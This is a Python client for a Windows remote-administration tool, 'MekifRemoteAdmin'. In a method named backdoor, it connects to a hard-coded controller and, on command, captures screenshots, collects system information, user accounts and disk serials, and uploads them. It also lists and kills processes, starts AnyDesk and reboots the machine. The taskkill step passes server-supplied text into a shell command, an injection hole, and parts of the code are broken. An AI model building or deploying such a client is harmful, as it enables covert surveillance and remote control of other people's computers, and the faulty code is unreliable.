from datetime import datetime
from threading import Thread
import subprocess
import threading
import random
import socket
import shutil
import psutil
import time
import sys
import os

# DONE: Fixes Screenshot file receive
# TODO: Fix systeminfo file receive


class Client:
    def __init__(self, server, main_path):
        self.main_path = main_path
        self.server_host = server[0]
        self.server_port = server[1]
        self.buffer_size = 16184
        self.d = datetime.now()
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        self.current_user = os.getlogin()
        self.hostname = socket.gethostname()
        self.localIP = str(socket.gethostbyname(self.hostname))
        if not os.path.exists(f'{self.main_path}'):
            os.makedirs(self.main_path)

    def sc_conn(self, path, filename):
        try:
            sc_soc.send(f"{filename}".encode())
            msg = soc.recv(1024).decode()
            print(msg)

            chunk = 40960000
            sc = open(filename, 'rb')
            while True:
                data = sc.read(chunk)
                if not data:
                    break

                sc_soc.sendall(data)

            sc.close()
            # sc_soc.close()

            return True

        except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
            return False

    def connection(self):
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while True:
            time.sleep(1)
            # print(colored(f"[i]Connecting to Server: {self.server_host} | Port {self.server_port}...", 'cyan'))
            try:
                soc.connect((self.server_host, self.server_port))

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                # print(colored(e, 'red'))
                continue

    def anydesk(self):
        self.d = datetime.now().replace(microsecond=0)
        self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
        subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])

        return

    def convert_to_bytes(self, no):
        result = bytearray()
        result.append(no & 255)
        for i in range(3):
            no = no >> 8
            result.append(no & 255)
        return result

    def bytes_to_number(self, b):
        # if Python2.x
        # b = map(ord, b)
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def backdoor(self, soc):
        # Send Computer Name to Server
        ident = self.hostname
        soc.send(ident.encode())

        user = self.current_user
        soc.send(user.encode())

        # Wait For Commands
        message = soc.recv(self.buffer_size).decode()
        # print(f"{colored(message, 'green')}")

        while True:
            try:
                command = soc.recv(self.buffer_size).decode()

            except (ConnectionResetError, ConnectionError, ConnectionAbortedError, ConnectionRefusedError):
                break

            try:
                if len(str(command)) == 0:
                    # print(colored("[!]Disconnected!", 'red'))
                    break

                # Vital Signs
                if str(command).lower() == "alive":
                    try:
                        soc.send('yes'.encode())

                    except ConnectionResetError:
                        break

                # Capture Screenshot
                elif str(command.lower()[:6]) == "screen":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y"))
                    self.fulldt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.filename = \
                        rf"c:\MekifRemoteAdmin\screenshot {self.hostname} {str(self.localIP)} {self.fulldt}.jpg"
                    self.chunk = 40960000
                    self.path = rf'c:\MekifRemoteAdmin\screenshot.ps1'
                    with open(self.path, 'w') as file:
                        file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                        file.write("Add-Type -AssemblyName System.Drawing\n\n")
                        file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
                        file.write("$Width  = $Screen.Width\n")
                        file.write("$Height = $Screen.Height\n")
                        file.write("$Left = $Screen.Left\n")
                        file.write("$Top = $Screen.Top\n\n")
                        file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
                        file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
                        file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
                        file.write(rf"$bitmap.Save('{self.filename}')")

                    time.sleep(0.2)

                    ps = subprocess.Popen(["powershell.exe", rf"{self.path}"], stdout=sys.stdout)
                    ps.communicate()
                    # self.sc_conn(self.path, self.filename)
                    try:
                        # Send filename to server
                        soc.send(f"{self.filename}".encode())

                        # Receive filename Confirmation from the server
                        msg = soc.recv(self.chunk).decode()
                        print(f"@Server: {msg}")
                        length = os.path.getsize(self.filename)
                        print(f"SC Size: {length}")
                        soc.send(self.convert_to_bytes(length))

                        # Send file content
                        with open(self.filename, 'rb') as img_file:
                            img_data = img_file.read(1024)
                            while img_data:
                                soc.send(img_data)
                                if not img_data:
                                    break

                                img_data = img_file.read(1024)

                        # Send Confirmation to server
                        soc.send(f"{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
                        os.remove(self.filename)
                        os.remove(self.path)

                    except ConnectionResetError:
                        break

                # Get System Information & Users
                elif str(command.lower()[:2]) == "si":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.sifile = rf"c:\MekifRemoteAdmin\systeminfo {self.hostname} {str(self.localIP)} {self.dt}.txt"

                    # self.boot_time(soc, systeminfofile)
                    sysinfo = open(self.sifile, 'w')
                    sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
                    sysinfo.write("\n")
                    allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
                    sysinfo.write("\n")
                    hard_drive = subprocess.call(['wmic', 'diskdrive', 'get', 'model,serialNumber,size,mediaType'],
                                                 stdout=sysinfo)
                    sysinfo.close()
                    try:
                        soc.send(f"{self.sifile}".encode())

                    except ConnectionResetError:
                        break

                    time.sleep(2)
                    length = os.path.getsize(self.sifile)
                    print(f"SysInfoFile Size: {length}")
                    soc.send(self.convert_to_bytes(length))

                    # sysinfo = open(self.sifile, 'r')
                    try:
                        with open(self.sifile, 'rb') as sy_file:
                            sys_data = sy_file.read(1024)
                            while sys_data:
                                soc.send(sys_data)
                                if not sys_data:
                                    break

                                sys_data = sy_file.read(1024)

                        msg = soc.recv(1024).decode()
                        print(f"@Server: {msg}")
                        soc.send(f"{self.hostname} | {self.localIP}: System Information Sent.\n".encode())

                    except socket.error:
                        break

                    os.remove(self.sifile)
                    continue

                # Get Last Restart Time
                elif str(command).lower()[:2] == "lr":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    last_reboot = psutil.boot_time()
                    try:
                        soc.send(f"{self.hostname} | {self.localIP}: "
                                 f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())

                        continue

                    except ConnectionResetError:
                        break

                # Get Current Logged-on User
                elif str(command).lower()[:4] == "user":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    try:
                        soc.send(f"{self.hostname} | {self.localIP}: Current User: {self.current_user}.\n".encode())
                        continue

                    except ConnectionResetError:
                        break

                # Run Anydesk
                elif str(command.lower()[:7]) == "anydesk":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.anydesk()
                    continue

                # Task List
                elif (str(command.lower())) == "tasks":
                    chunk = 1000000
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    self.taskfile = rf"c:\MekifRemoteAdmin\tasks {self.hostname} {str(self.localIP)} {self.dt}.txt"

                    sysinfo = open(self.taskfile, 'w')
                    sinfo = subprocess.call(['tasklist'], stdout=sysinfo)
                    sysinfo.write("\n")
                    sysinfo.close()
                    soc.send(f"{self.taskfile}".encode())

                    with open(self.taskfile, 'r') as file:
                        for line in file.readlines():
                            task_list.append(line)

                    for t in task_list:
                        print(t)

                    time.sleep(0.5)
                    sysinfo = open(self.taskfile, 'r')

                    while True:
                        data = sysinfo.read(chunk)
                        soc.sendall(data.encode())

                        if not data:
                            sysinfo.close()
                            break

                    msg = soc.recv(1024).decode()
                    soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())
                    os.remove(self.taskfile)

                    # Kill Task
                    try:
                        kill = soc.recv(1024).decode()
                        if str(kill) == "kill":
                            task2kill = soc.recv(1024).decode()
                            os.system(f'taskkill /IM {task2kill} /F')
                            soc.send(f"Task: {task2kill} Killed.".encode())
                            continue

                        else:
                            continue

                    except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                        break

                # Restart Machine
                elif str(command.lower()[:7]) == "restart":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    os.system('shutdown /r /t 1')

                # Close Connection
                elif str(command.lower()) == "exit":
                    self.d = datetime.now().replace(microsecond=0)
                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                    # print(colored('[!]Connection closed by server.', 'yellow'))
                    soc.shutdown(socket.SHUT_RDWR)
                    soc.close()
                    self.connection()

                continue

            except Exception as err:
                self.connection()

        self.connection()


def run_powershell(cmd):
    return subprocess.run(["powershell", "-Command", cmd], capture_output=True)


def run_cmd(cmd):
    return subprocess.run(cmd, capture_output=True)


def check_file_path(pat, subpat=None, file=None):
    if subpat is None:
        pass

    if os.path.exists(pat):
        if not subpat:
            newfile = os.path.join(pat, file)
            print(newfile)

            return newfile

        elif not file:
            return False

    else:
        os.makedirs(pat)
        if not subpat:
            newfile = os.path.join(pat, file)
            return newfile

        else:
            newpath = os.path.join(pat, subpat)
            newfile = os.path.join(newpath, file)

        return newfile


if __name__ == "__main__":
    task_list = []
    mekif_path = r'c:\MekifRemoteAdmin'
    servers = [('192.168.1.10', 55400)]
    soc = socket.socket()
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Start Client
    while True:
        for server in servers:
            client = Client(server, mekif_path)
            time.sleep(1)
            try:
                soc.connect(server)

            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError) as e:
                # print(colored(e, 'red'))
                continue
            client.backdoor(soc)
